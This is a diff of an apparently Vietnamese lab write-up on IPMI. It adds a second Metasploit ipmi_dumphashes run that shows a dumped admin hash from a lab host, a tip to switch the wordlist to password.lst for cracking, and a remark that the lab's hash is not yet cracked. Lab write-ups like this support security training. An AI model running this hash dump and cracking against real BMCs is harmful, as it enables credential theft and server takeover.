@@ -125,7 +125,7 @@ Kết luận ngắn: ưu tiên hardening mạng và mật khẩu BMC; coi việc
        USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
     
     
-    
+============= Kết quả 1 =============    
     msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
     
     [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
@@ -133,10 +133,20 @@ Kết luận ngắn: ưu tiên hardening mạng và mật khẩu BMC; coi việc
     [*] Scanned 1 of 1 hosts (100% complete)
     [*] Auxiliary module execution completed
   
+============= Kết quả 2 =============
+
+msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
+[+] 10.129.199.31:623 - IPMI - Hash found: admin:741c3bae04550d00ab23b8ae665a64308f06ef0db969f46f3d7a374b7de2f1d217c733a242292473a123456789abcdefa123456789abcdef140561646d696e:d02c9dc04543e3805761b1fd3356ca8f94edeac4
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
 
 
+I found a very quick solution of the last question:
+In msfconsole, I just changed the default PASS_FILE path to /usr/share/metasploit-framework/data/wordlists/password.lst
+Concept:
+I manually browsed to above path and checked the password files and choose the password.lst as it have fairly similar passwords that may be set in IPMI as explained in the module.
+And then hit run. DONE
 
-
-
+Chung quy lại Bài lab này đang chưa giải mã được password với mã hash đã tìm được. 
 
 
